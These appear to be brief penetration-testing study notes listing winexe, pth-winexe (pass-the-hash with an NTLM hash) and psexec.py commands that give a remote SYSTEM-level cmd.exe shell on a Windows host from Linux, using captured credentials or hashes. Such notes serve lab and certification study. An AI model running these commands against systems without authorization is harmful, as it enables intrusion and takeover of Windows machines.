Credentials or Hash: [ Note we can escalate our privileges to admin/System by using some tools which allows us to access cmd via linux terminal.]

1. winexe [ Password based access]

-- winexe -U 'username%password' //IP cmd.exe --system (If we want to use cmd as system then --system)

2. pth-winexe [ Hash based access Pass-The-Hash ]

-- pth-winexe -U 'username%NTLM-HASH' //IP cmd.exe --system (If we want to use cmd as system then --system)

3. psexec.py

-- psexec.py username:password@IP [ Executes shell as SYSTEM if credentials for admin account is correct]
